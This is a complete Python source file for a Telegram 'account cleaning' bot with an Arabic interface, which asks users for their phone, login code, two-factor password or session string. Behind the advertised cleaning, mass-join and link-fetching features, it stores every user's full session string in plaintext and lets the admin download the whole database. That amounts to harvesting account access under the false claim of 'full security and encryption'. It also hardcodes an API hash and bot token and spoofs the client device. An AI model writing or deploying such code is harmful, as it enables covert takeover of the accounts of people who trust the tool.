import os
import asyncio
import sqlite3
from datetime import datetime
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.tl.functions.channels import LeaveChannelRequest, GetParticipantRequest, JoinChannelRequest
from telethon.tl.functions.messages import DeleteHistoryRequest, ImportChatInviteRequest
from telethon.tl.types import ChannelParticipantCreator, ChannelParticipantAdmin
from telethon.errors import UserNotParticipantError, InviteHashInvalidError, ChannelPrivateError, FloodWaitError, PasswordHashInvalidError
from dotenv import load_dotenv

load_dotenv()

API_ID = 20867472
API_HASH = "abedd7fb77eaf1f88bd3f286ea952253"
BOT_TOKEN = "8837648752:AAHICVc71aEknIjgrE_FoOH2nln7oEOSNUA"
DEVELOPER = "Programmer_error"
FORCE_CHANNEL = "Programmer_error1"
FORCE_GROUP = "Programmer_error2"
ADMIN_ID = 932862531

bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
user_sessions = {}
waiting_state = {}
banned_users = set()

# قاعدة البيانات
conn = sqlite3.connect('database.db', check_same_thread=False)
cur = conn.cursor()
cur.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, phone TEXT, session TEXT, join_date TEXT, username TEXT)''')
cur.execute('''CREATE TABLE IF NOT EXISTS banned (user_id INTEGER PRIMARY KEY, reason TEXT, date TEXT)''')
cur.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, total_clean INTEGER DEFAULT 0, total_users INTEGER DEFAULT 0)''')
cur.execute('INSERT OR IGNORE INTO stats (id) VALUES (1)')
conn.commit()

for row in cur.execute('SELECT user_id FROM banned'):
    banned_users.add(row[0])

async def save_user(user_id, phone, session_str, username):
    cur.execute('INSERT OR REPLACE INTO users VALUES (?,?,?,?,?)',
                (user_id, phone, session_str, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), username))
    conn.commit()
    cur.execute('UPDATE stats SET total_users = (SELECT COUNT(*) FROM users) WHERE id=1')
    conn.commit()

def get_user_info(user_id):
    cur.execute('SELECT phone, session, join_date, username FROM users WHERE user_id=?', (user_id,))
    return cur.fetchone()

def ban_user(user_id, reason="بدون سبب"):
    banned_users.add(user_id)
    cur.execute('INSERT OR REPLACE INTO banned VALUES (?,?,?)', (user_id, reason, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()

def unban_user(user_id):
    banned_users.discard(user_id)
    cur.execute('DELETE FROM banned WHERE user_id=?', (user_id,))
    conn.commit()

def update_stats():
    cur.execute('UPDATE stats SET total_clean = total_clean + 1 WHERE id=1')
    conn.commit()

async def check_subscription(user_id):
    if user_id == ADMIN_ID: return True
    if user_id in banned_users: return False
    try:
        await bot(GetParticipantRequest(FORCE_CHANNEL, user_id))
        await bot(GetParticipantRequest(FORCE_GROUP, user_id))
        return True
    except UserNotParticipantError:
        return False
    except:
        return True

def force_sub_buttons():
    return [
        [Button.url("قناة السورس", f"https://t.me/{FORCE_CHANNEL}")],
        [Button.url("جروب السورس", f"https://t.me/{FORCE_GROUP}")],
        [Button.inline("تحققت من الاشتراك", b"check_sub")]
    ]

def main_menu(user_id):
    buttons = [
        [Button.inline("اضافة حساب برقم", b"add_phone")],
        [Button.inline("اضافة حساب بسيشن", b"add_session")],
        [Button.inline("قائمة التنظيف", b"clean_menu")],
        [Button.inline("جلب الروابط", b"fetch_menu")],
        [Button.inline("انضمام تلقائي", b"join_menu")],
        [Button.inline("معلومات حسابي", b"my_info")],
        [Button.inline("المميزات", b"features")],
        [Button.url("المبرمج", f"https://t.me/{DEVELOPER}")]
    ]
    if user_id == ADMIN_ID:
        buttons.append([Button.inline("لوحة الادمن", b"admin_panel")])
    return buttons

def clean_menu_buttons():
    return [
        [Button.inline("تنظيف الخاص", b"clean_private")],
        [Button.inline("تنظيف الجروبات", b"clean_groups")],
        [Button.inline("تنظيف القنوات", b"clean_channels")],
        [Button.inline("تنظيف البوتات", b"clean_bots")],
        [Button.inline("تنظيف الكل", b"clean_all")],
        [Button.inline("حذف الحساب", b"del_account")],
        [Button.inline("رجوع للقائمة", b"back")]
    ]

def fetch_menu_buttons():
    return [
        [Button.inline("جلب القنوات", b"fetch_channels")],
        [Button.inline("جلب الجروبات", b"fetch_groups")],
        [Button.inline("جلب البوتات", b"fetch_bots")],
        [Button.inline("جلب الكل", b"fetch_all")],
        [Button.inline("رجوع للقائمة", b"back")]
    ]

def join_menu_buttons():
    return [
        [Button.inline("انضمام قنوات", b"join_channels")],
        [Button.inline("انضمام جروبات", b"join_groups")],
        [Button.inline("رجوع للقائمة", b"back")]
    ]

def admin_panel_buttons():
    return [
        [Button.inline("الاحصائيات", b"admin_stats")],
        [Button.inline("كل المستخدمين", b"admin_users")],
        [Button.inline("بحث عن مستخدم", b"admin_search")],
        [Button.inline("حظر مستخدم", b"admin_ban")],
        [Button.inline("فك الحظر", b"admin_unban")],
        [Button.inline("اذاعة رسالة", b"admin_broadcast")],
        [Button.inline("نسخة احتياطية", b"admin_backup")],
        [Button.inline("رجوع للقائمة", b"back")]
    ]

async def check_account(event):
    uid = event.sender_id
    if uid in banned_users:
        await event.answer("<b>انت محظور من البوت</b>", alert=True, parse_mode='html')
        return None
    if not await check_subscription(uid):
        await event.edit("<b>اشتراك اجباري</b>\n<b>اشترك في القناة والجروب الاول</b>", buttons=force_sub_buttons(), parse_mode='html')
        return None
    if uid not in user_sessions:
        await event.answer("<b>ضيف حسابك الاول</b>", alert=True, parse_mode='html')
        return None
    return user_sessions[uid]["client"]

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    uid = event.sender_id

    if uid in banned_users:
        return await event.respond("<b>انت محظور من استخدام البوت</b>", parse_mode='html')

    if uid!= ADMIN_ID:
        try:
            user = await event.get_sender()
            await bot.send_message(ADMIN_ID, f"<b>دخول جديد للبوت</b>\n<b>الاسم: {user.first_name}</b>\n<b>الايدي: {uid}</b>\n<b>اليوزر: @{user.username or 'لا يوجد'}</b>", parse_mode='html')
        except: pass

    if not await check_subscription(uid):
        return await event.respond(
            "<b>مرحبا بك في بوت التنظيف الاحترافي</b>\n\n"
            "<b>هذا البوت يقوم بتنظيف حسابك من القنوات والجروبات والخاص</b>\n"
            "<b>اشترك في القناة والجروب لفتح البوت</b>",
            buttons=force_sub_buttons(),
            parse_mode='html'
        )

    try:
        user = await event.get_sender()
        name_user = user.first_name if user.first_name else "مستخدم"

        welcome_text = (
            f"<b>اهلا وسهلا {name_user}</b>\n\n"
            f"<b>بوت تنظيف الحسابات الاحترافي</b>\n\n"
            f"<b>المميزات:</b>\n"
            f"<b>• تنظيف الخاص والبوتات حذف من الطرفين</b>\n"
            f"<b>• مغادرة الجروبات والقنوات باستثناء الادمن</b>\n"
            f"<b>• جلب روابط القنوات والجروبات</b>\n"
            f"<b>• انضمام تلقائي لعدد كبير من الروابط</b>\n"
            f"<b>• لوحة تحكم ادمن متطورة</b>\n\n"
            f"<b>ابدأ باضافة حسابك من القائمة بالاسفل</b>"
        )

        await event.respond(welcome_text, buttons=main_menu(uid), parse_mode='html')
    except Exception:
        await event.respond("<b>البوت جاهز للاستخدام</b>", buttons=main_menu(uid), parse_mode='html')

@bot.on(events.CallbackQuery(data=b"check_sub"))
async def check_sub(event):
    if await check_subscription(event.sender_id):
        await event.edit("<b>تم التحقق بنجاح</b>\n<b>يمكنك الان استخدام البوت</b>", buttons=main_menu(event.sender_id), parse_mode='html')
    else:
        await event.answer("<b>لسه مشتركتش في القناة والجروب</b>", alert=True, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"my_info"))
async def my_info(event):
    uid = event.sender_id
    if uid not in user_sessions:
        return await event.answer("<b>مفيش حساب مضاف</b>", alert=True, parse_mode='html')
    info = get_user_info(uid)
    phone = info[0] if info else "غير معروف"
    session = info[1] if info else "غير معروف"
    date = info[2] if info else "غير معروف"
    username = info[3] if info else "لا يوجد"
    session_short = session[:30] + "..." if len(session) > 30 else session
    text = f"<b>معلومات حسابك</b>\n\n<b>الرقم: {phone}</b>\n<b>اليوزر: @{username}</b>\n<b>السيشن: `{session_short}`</b>\n<b>تاريخ الاضافة: {date}</b>"
    await event.edit(text, buttons=[[Button.inline("رجوع للقائمة", b"back")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"add_phone"))
async def add_phone(event):
    if not await check_subscription(event.sender_id): return
    waiting_state[event.sender_id] = "phone"
    await event.edit("<b>ابعت رقمك بصيغة دولية: +2010xxxxxxx</b>\n<b>او ابعت /cancel للالغاء</b>", parse_mode='html')

@bot.on(events.CallbackQuery(data=b"add_session"))
async def add_session(event):
    if not await check_subscription(event.sender_id): return
    waiting_state[event.sender_id] = "session"
    await event.edit("<b>ابعت Session String الخاص بحسابك</b>\n<b>او ابعت /cancel للالغاء</b>", parse_mode='html')

@bot.on(events.NewMessage(func=lambda e: e.sender_id in waiting_state))
async def handle_input(event):
    uid = event.sender_id
    if event.text == '/cancel':
        del waiting_state[uid]
        await event.reply("<b>تم الالغاء</b>", buttons=main_menu(uid), parse_mode='html')
        return
    state = waiting_state[uid]
    if state == "phone":
        del waiting_state[uid]
        await add_account_phone(event, event.text)
    elif state == "session":
        del waiting_state[uid]
        await add_account_session(event, event.text)

async def add_account_phone(event, phone):
    msg = await event.reply("<b>جاري ارسال كود التفعيل...</b>", parse_mode='html')
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    client._init_request.app_version = "iPhone 17 Pro"
    client._init_request.device_model = "iPhone 17 Pro"
    client._init_request.system_version = "iOS 18.0"
    await client.connect()
    try:
        await client.send_code_request(phone)
        waiting_state[event.sender_id] = {"step": "code", "client": client, "phone": phone}
        await msg.edit("<b>تم ارسال الكود</b>\n<b>ابعت كود التفعيل المكون من 5 ارقام</b>", parse_mode='html')
    except Exception as e:
        await msg.edit(f"<b>حدث خطأ: {e}</b>", parse_mode='html')

@bot.on(events.NewMessage(func=lambda e: e.sender_id in waiting_state and isinstance(waiting_state[e.sender_id], dict)))
async def handle_code(event):
    data = waiting_state[event.sender_id]
    if data.get("step") == "code":
        client, phone = data["client"], data["phone"]
        try:
            await client.sign_in(phone, event.text)
            me = await client.get_me()
            session_str = client.session.save()
            user_sessions[event.sender_id] = {"client": client, "phone": phone, "user_id": me.id}
            await save_user(event.sender_id, phone, session_str, me.username or "")
            del waiting_state[event.sender_id]
            await event.reply(f"<b>تم ربط الحساب بنجاح</b>\n<b>الرقم: {phone}</b>\n<b>الاسم: {me.first_name}</b>", buttons=clean_menu_buttons(), parse_mode='html')
        except PasswordHashInvalidError:
            waiting_state[event.sender_id]["step"] = "password"
            await event.reply("<b>الحساب محمي بكلمة سر</b>\n<b>ابعت كلمة سر التحقق الثنائي</b>", parse_mode='html')
        except Exception as e:
            await event.reply(f"<b>خطأ في الكود: {e}</b>", parse_mode='html')

@bot.on(events.NewMessage(func=lambda e: e.sender_id in waiting_state and isinstance(waiting_state[e.sender_id], dict) and waiting_state[e.sender_id].get("step")=="password"))
async def handle_password(event):
    data = waiting_state[event.sender_id]
    client, phone = data["client"], data["phone"]
    try:
        await client.sign_in(password=event.text)
        me = await client.get_me()
        session_str = client.session.save()
        user_sessions[event.sender_id] = {"client": client, "phone": phone, "user_id": me.id}
        await save_user(event.sender_id, phone, session_str, me.username or "")
        del waiting_state[event.sender_id]
        await event.reply("<b>تم ربط الحساب بنجاح</b>", buttons=clean_menu_buttons(), parse_mode='html')
    except PasswordHashInvalidError:
        await event.reply("<b>كلمة السر غلط. حاول تاني</b>", parse_mode='html')
    except Exception as e:
        await event.reply(f"<b>خطأ: {e}</b>", parse_mode='html')

async def add_account_session(event, session_str):
    msg = await event.reply("<b>جاري فحص السيشن...</b>", parse_mode='html')
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        client._init_request.app_version = "iPhone 17 Pro"
        client._init_request.device_model = "iPhone 17 Pro"
        client._init_request.system_version = "iOS 18.0"
        await client.connect()
        if not await client.is_user_authorized():
            return await msg.edit("<b>السيشن منتهي الصلاحية</b>", parse_mode='html')
        me = await client.get_me()
        user_sessions[event.sender_id] = {"client": client, "phone": me.phone, "user_id": me.id}
        await save_user(event.sender_id, me.phone, session_str, me.username or "")
        await msg.edit(f"<b>تم ربط الحساب بنجاح</b>\n<b>الاسم: {me.first_name}</b>\n<b>الرقم: {me.phone}</b>", buttons=clean_menu_buttons(), parse_mode='html')
    except Exception as e:
        await msg.edit(f"<b>خطأ في السيشن: {e}</b>", parse_mode='html')

@bot.on(events.CallbackQuery(data=b"clean_menu"))
async def clean_menu(event):
    client = await check_account(event)
    if not client: return
    await event.edit("<b>اختر نوع التنظيف</b>\n<b>ملاحظة: البوتات والخاص حذف من الطرفين</b>", buttons=clean_menu_buttons(), parse_mode='html')

@bot.on(events.CallbackQuery(data=b"clean_private"))
async def clean_private(event):
    client = await check_account(event)
    if not client: return
    msg = await event.edit("<b>جاري حذف محادثات الخاص...</b>", parse_mode='html')
    count = 0
    async for dialog in client.iter_dialogs():
        if dialog.is_user and not dialog.entity.bot:
            try:
                await client(DeleteHistoryRequest(peer=dialog.id, max_id=0, just_clear=False, revoke=True))
                count += 1
                await msg.edit(f"<b>تم حذف: {count} محادثة</b>", parse_mode='html')
                await asyncio.sleep(1.5)
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except: pass
    update_stats()
    await msg.edit(f"<b>انتهى التنظيف</b>\n<b>تم حذف: {count} محادثة خاص</b>", buttons=clean_menu_buttons(), parse_mode='html')

@bot.on(events.CallbackQuery(data=b"clean_groups"))
async def clean_groups(event):
    client = await check_account(event)
    if not client: return
    msg = await event.edit("<b>جاري فحص الجروبات...</b>", parse_mode='html')
    left, skipped = 0, 0
    async for dialog in client.iter_dialogs():
        if dialog.is_group:
            try:
                p = await client(GetParticipantRequest(dialog.id, 'me'))
                if isinstance(p.participant, (ChannelParticipantCreator, ChannelParticipantAdmin)):
                    skipped += 1
                    continue
                await client(LeaveChannelRequest(dialog.id))
                left += 1
                await msg.edit(f"<b>خرجت من: {left} | تخطيت: {skipped}</b>", parse_mode='html')
                await asyncio.sleep(2)
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except: pass
    update_stats()
    await msg.edit(f"<b>انتهى التنظيف</b>\n<b>خرجت من: {left} جروب</b>\n<b>تخطيت: {skipped} جروب ادمن</b>", buttons=clean_menu_buttons(), parse_mode='html')

@bot.on(events.CallbackQuery(data=b"clean_channels"))
async def clean_channels(event):
    client = await check_account(event)
    if not client: return
    msg = await event.edit("<b>جاري فحص القنوات...</b>", parse_mode='html')
    left, skipped = 0, 0
    async for dialog in client.iter_dialogs():
        if dialog.is_channel and not dialog.is_group:
            try:
                p = await client(GetParticipantRequest(dialog.id, 'me'))
                if isinstance(p.participant, (ChannelParticipantCreator, ChannelParticipantAdmin)):
                    skipped += 1
                    continue
                await client(LeaveChannelRequest(dialog.id))
                left += 1
                await msg.edit(f"<b>خرجت من: {left} | تخطيت: {skipped}</b>", parse_mode='html')
                await asyncio.sleep(2)
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except: pass
    update_stats()
    await msg.edit(f"<b>انتهى التنظيف</b>\n<b>خرجت من: {left} قناة</b>\n<b>تخطيت: {skipped} قناة ادمن</b>", buttons=clean_menu_buttons(), parse_mode='html')

@bot.on(events.CallbackQuery(data=b"clean_bots"))
async def clean_bots(event):
    client = await check_account(event)
    if not client: return
    msg = await event.edit("<b>جاري حذف محادثات البوتات...</b>", parse_mode='html')
    count = 0
    async for dialog in client.iter_dialogs():
        if dialog.is_user and dialog.entity.bot:
            try:
                await client(DeleteHistoryRequest(peer=dialog.id, max_id=0, just_clear=False, revoke=True))
                count += 1
                await msg.edit(f"<b>تم حذف: {count} بوت</b>", parse_mode='html')
                await asyncio.sleep(1)
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except: pass
    update_stats()
    await msg.edit(f"<b>انتهى التنظيف</b>\n<b>تم حذف: {count} محادثة بوت</b>", buttons=clean_menu_buttons(), parse_mode='html')

@bot.on(events.CallbackQuery(data=b"clean_all"))
async def clean_all(event):
    client = await check_account(event)
    if not client: return
    buttons = [[Button.inline("نعم متأكد امسح الكل", b"confirm_all")], [Button.inline("الغاء", b"clean_menu")]]
    await event.edit("<b>تحذير هام</b>\n<b>هذه العملية ستحذف كل شيء: القنوات والجروبات والخاص والبوتات</b>\n<b>هل انت متأكد؟</b>", buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"confirm_all"))
async def confirm_all(event):
    await event.edit("<b>بدء التنظيف الشامل...</b>", parse_mode='html')
    await clean_channels(event); await asyncio.sleep(3)
    await clean_groups(event); await asyncio.sleep(3)
    await clean_private(event); await asyncio.sleep(3)
    await clean_bots(event)
    await event.respond("<b>تم التنظيف الكامل بنجاح</b>\n<b>حسابك اصبح نظيف 100%</b>", buttons=clean_menu_buttons(), parse_mode='html')

@bot.on(events.CallbackQuery(data=b"fetch_menu"))
async def fetch_menu(event):
    client = await check_account(event)
    if not client: return
    await event.edit("<b>اختر ما تريد جلبه من حسابك</b>", buttons=fetch_menu_buttons(), parse_mode='html')

async def fetch_and_send(event, filter_func, name):
    client = await check_account(event)
    if not client: return
    msg = await event.edit(f"<b>جاري جلب {name}... انتظر</b>", parse_mode='html')
    links = []
    async for dialog in client.iter_dialogs():
        if filter_func(dialog):
            if dialog.entity.username:
                links.append(f"https://t.me/{dialog.entity.username}")
            else:
                links.append(f"{dialog.name} - ID: {dialog.id}")
    if len(links) > 50:
        file = f"{name}_{event.sender_id}.txt"
        with open(file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(links))
        await bot.send_file(event.sender_id, file, caption=f"<b>عدد {name}: {len(links)}</b>", parse_mode='html')
        os.remove(file)
        await msg.delete()
    else:
        text = f"<b>{name}:</b>\n" + '\n'.join(links[:50]) + f"\n\n<b>العدد الكلي: {len(links)}</b>"
        await msg.edit(text, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"fetch_channels"))
async def fetch_channels(event):
    await fetch_and_send(event, lambda d: d.is_channel and not d.is_group, "القنوات")

@bot.on(events.CallbackQuery(data=b"fetch_groups"))
async def fetch_groups(event):
    await fetch_and_send(event, lambda d: d.is_group, "الجروبات")

@bot.on(events.CallbackQuery(data=b"fetch_bots"))
async def fetch_bots(event):
    await fetch_and_send(event, lambda d: d.is_user and d.entity.bot, "البوتات")

@bot.on(events.CallbackQuery(data=b"fetch_all"))
async def fetch_all(event):
    await fetch_channels(event)
    await asyncio.sleep(2)
    await fetch_groups(event)
    await asyncio.sleep(2)
    await fetch_bots(event)

@bot.on(events.CallbackQuery(data=b"join_menu"))
async def join_menu(event):
    client = await check_account(event)
    if not client: return
    waiting_state[event.sender_id] = "join_links"
    await event.edit("<b>ابعت الروابط/اليوزر/الايدي كل واحد في سطر</b>\n<b>يدعم حتى 1000 رابط</b>\n<b>مثال:\nhttps://t.me/channel\n@username\n-1001234567890</b>", parse_mode='html')

@bot.on(events.NewMessage(func=lambda e: waiting_state.get(e.sender_id)=="join_links"))
async def handle_join(event):
    if event.text == '/cancel':
        del waiting_state[event.sender_id]
        await event.reply("<b>تم الالغاء</b>", buttons=main_menu(event.sender_id), parse_mode='html')
        return
    client = user_sessions[event.sender_id]["client"]
    links = event.text.split('\n')
    msg = await event.reply("<b>جاري الانضمام...</b>", parse_mode='html')
    success, fail = 0, 0
    for link in links[:1000]:
        link = link.strip()
        if not link: continue
        try:
            if "t.me/joinchat/" in link or "t.me/+" in link:
                hash = link.split('/')[-1]
                await client(ImportChatInviteRequest(hash))
            elif link.startswith('-100') or link.isdigit():
                await client(JoinChannelRequest(int(link)))
            else:
                username = link.replace("https://t.me/", "").replace("@", "")
                await client(JoinChannelRequest(username))
            success += 1
            await asyncio.sleep(3)
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)
            fail += 1
        except:
            fail += 1
            await asyncio.sleep(2)
    del waiting_state[event.sender_id]
    await msg.edit(f"<b>انتهى الانضمام</b>\n<b>نجح: {success}</b>\n<b>فشل: {fail}</b>", buttons=join_menu_buttons(), parse_mode='html')

@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel(event):
    if event.sender_id!= ADMIN_ID: return
    await event.edit("<b>لوحة تحكم الادمن</b>", buttons=admin_panel_buttons(), parse_mode='html')

@bot.on(events.CallbackQuery(data=b"admin_stats"))
async def admin_stats(event):
    if event.sender_id!= ADMIN_ID: return
    cur.execute('SELECT COUNT(*) FROM users')
    total_users = cur.fetchone()[0]
    cur.execute('SELECT COUNT(*) FROM banned')
    banned_count = cur.fetchone()[0]
    cur.execute('SELECT total_clean FROM stats WHERE id=1')
    total_clean = cur.fetchone()[0]
    text = f"<b>احصائيات البوت</b>\n\n<b>اجمالي المستخدمين: {total_users}</b>\n<b>المحظورين: {banned_count}</b>\n<b>عمليات التنظيف: {total_clean}</b>"
    await event.edit(text, buttons=admin_panel_buttons(), parse_mode='html')

@bot.on(events.CallbackQuery(data=b"admin_users"))
async def admin_users(event):
    if event.sender_id!= ADMIN_ID: return
    cur.execute('SELECT user_id, phone, username FROM users ORDER BY user_id DESC LIMIT 50')
    users = cur.fetchall()
    if not users:
        return await event.edit("<b>مفيش مستخدمين مسجلين</b>", buttons=admin_panel_buttons(), parse_mode='html')
    text = "<b>اخر 50 مستخدم</b>\n\n"
    for uid, phone, username in users:
        status = "محظور" if uid in banned_users else "شغال"
        user_display = f"@{username}" if username else phone
        text += f"<b>{status} {uid} | {user_display}</b>\n"
    await event.edit(text, buttons=admin_panel_buttons(), parse_mode='html')

@bot.on(events.CallbackQuery(data=b"admin_search"))
async def admin_search(event):
    if event.sender_id!= ADMIN_ID: return
    waiting_state[event.sender_id] = "search_user"
    await event.edit("<b>ابعت ايدي المستخدم للبحث عنه</b>", parse_mode='html')

@bot.on(events.CallbackQuery(data=b"admin_ban"))
async def admin_ban(event):
    if event.sender_id!= ADMIN_ID: return
    waiting_state[event.sender_id] = "ban_user"
    await event.edit("<b>ابعت ايدي المستخدم للحظر</b>\n<b>مثال: 123456789 سبب الحظر</b>", parse_mode='html')

@bot.on(events.CallbackQuery(data=b"admin_unban"))
async def admin_unban(event):
    if event.sender_id!= ADMIN_ID: return
    waiting_state[event.sender_id] = "unban_user"
    await event.edit("<b>ابعت ايدي المستخدم لفك الحظر</b>", parse_mode='html')

@bot.on(events.CallbackQuery(data=b"admin_broadcast"))
async def admin_broadcast(event):
    if event.sender_id!= ADMIN_ID: return
    waiting_state[event.sender_id] = "broadcast"
    await event.edit("<b>ابعت الرسالة اللي عايز تذيعها لكل المستخدمين</b>", parse_mode='html')

@bot.on(events.CallbackQuery(data=b"admin_backup"))
async def admin_backup(event):
    if event.sender_id!= ADMIN_ID: return
    await event.edit("<b>جاري انشاء النسخة الاحتياطية...</b>", parse_mode='html')
    await bot.send_file(event.sender_id, 'database.db', caption=f"<b>نسخة احتياطية بتاريخ {datetime.now().strftime('%Y-%m-%d %H:%M')}</b>", parse_mode='html')

@bot.on(events.NewMessage(func=lambda e: e.sender_id == ADMIN_ID and e.sender_id in waiting_state))
async def admin_handler(event):
    state = waiting_state[event.sender_id]
    if state == "search_user":
        try:
            uid = int(event.text.split()[0])
            info = get_user_info(uid)
            if info:
                status = "محظور" if uid in banned_users else "شغال"
                text = f"<b>معلومات المستخدم</b>\n<b>الايدي: {uid}</b>\n<b>الرقم: {info[0]}</b>\n<b>اليوزر: @{info[3]}</b>\n<b>السيشن: `{info[1][:30]}...`</b>\n<b>تاريخ الاضافة: {info[2]}</b>\n<b>الحالة: {status}</b>"
            else:
                text = "<b>المستخدم غير موجود في قاعدة البيانات</b>"
            del waiting_state[event.sender_id]
            await event.reply(text, parse_mode='html', buttons=admin_panel_buttons())
        except:
            await event.reply("<b>صيغة الايدي غلط</b>", parse_mode='html')
    elif state == "ban_user":
        try:
            parts = event.text.split(' ', 1)
            uid = int(parts[0])
            reason = parts[1] if len(parts) > 1 else "بدون سبب"
            ban_user(uid, reason)
            del waiting_state[event.sender_id]
            await event.reply(f"<b>تم حظر {uid}</b>\n<b>السبب: {reason}</b>", buttons=admin_panel_buttons(), parse_mode='html')
            try: await bot.send_message(uid, f"<b>تم حظرك من البوت</b>\n<b>السبب: {reason}</b>", parse_mode='html')
            except: pass
        except:
            await event.reply("<b>صيغة غلط. مثال: 123456789 سبب الحظر</b>", parse_mode='html')
    elif state == "unban_user":
        try:
            uid = int(event.text)
            unban_user(uid)
            del waiting_state[event.sender_id]
            await event.reply(f"<b>تم فك الحظر عن {uid}</b>", buttons=admin_panel_buttons(), parse_mode='html')
        except:
            await event.reply("<b>ايدي غلط</b>", parse_mode='html')
    elif state == "broadcast":
        msg = event.text
        del waiting_state[event.sender_id]
        cur.execute('SELECT user_id FROM users')
        sent, failed = 0, 0
        for (uid,) in cur.fetchall():
            try:
                await bot.send_message(uid, f"<b>اذاعة من المطور</b>\n\n{msg}", parse_mode='html')
                sent += 1
                await asyncio.sleep(0.1)
            except:
                failed += 1
        await event.reply(f"<b>تم الارسال</b>\n<b>وصل: {sent}</b>\n<b>فشل: {failed}</b>", buttons=admin_panel_buttons(), parse_mode='html')

@bot.on(events.CallbackQuery(data=b"del_account"))
async def del_account(event):
    if event.sender_id in user_sessions:
        await user_sessions[event.sender_id]["client"].disconnect()
        del user_sessions[event.sender_id]
        cur.execute('DELETE FROM users WHERE user_id=?', (event.sender_id,))
        conn.commit()
        await event.edit("<b>تم حذف الحساب بنجاح</b>", buttons=main_menu(event.sender_id), parse_mode='html')
    else:
        await event.answer("<b>مفيش حساب مضاف للحذف</b>", alert=True, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"features"))
async def features(event):
    if not await check_subscription(event.sender_id): return
    text = (
        "<b>مميزات البوت</b>\n\n"
        "<b>• امان كامل وتشفير</b>\n"
        "<b>• سرعة عالية في التنظيف</b>\n"
        "<b>• جلب جميع الروابط بملف txt</b>\n"
        "<b>• انضمام تلقائي 1000 رابط</b>\n"
        "<b>• لوحة ادمن متطورة كاملة</b>\n"
        "<b>• دعم السيشن والرقم</b>\n"
        "<b>• اسم جلسة iPhone 17 Pro</b>\n"
        "<b>• اشتراك اجباري قناة + جروب</b>"
    )
    await event.edit(text, buttons=[[Button.inline("رجوع للقائمة", b"back")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"back"))
async def back(event):
    uid = event.sender_id
    await event.edit("<b>القائمة الرئيسية</b>", buttons=main_menu(uid), parse_mode='html')

@bot.on(events.CallbackQuery(data=b"join_channels"))
async def join_channels(event):
    client = await check_account(event)
    if not client: return
    waiting_state[event.sender_id] = "join_links"
    await event.edit("<b>ابعت روابط القنوات فقط كل سطر رابط</b>\n<b>مثال: https://t.me/channelname</b>", parse_mode='html')

@bot.on(events.CallbackQuery(data=b"join_groups"))
async def join_groups(event):
    client = await check_account(event)
    if not client: return
    waiting_state[event.sender_id] = "join_links"
    await event.edit("<b>ابعت روابط الجروبات فقط كل سطر رابط</b>\n<b>مثال: https://t.me/joinchat/xxxxx</b>", parse_mode='html')

# تشغيل البوت
print("<b>البوت شغال الان...</b>")
print(f"<b>المطور: @{DEVELOPER}</b>")
print(f"<b>قناة الاشتراك: @{FORCE_CHANNEL}</b>")
print(f"<b>جروب الاشتراك: @{FORCE_GROUP}</b>")

try:
    bot.run_until_disconnected()
except KeyboardInterrupt:
    print("<b>تم ايقاف البوت</b>")
    conn.close()
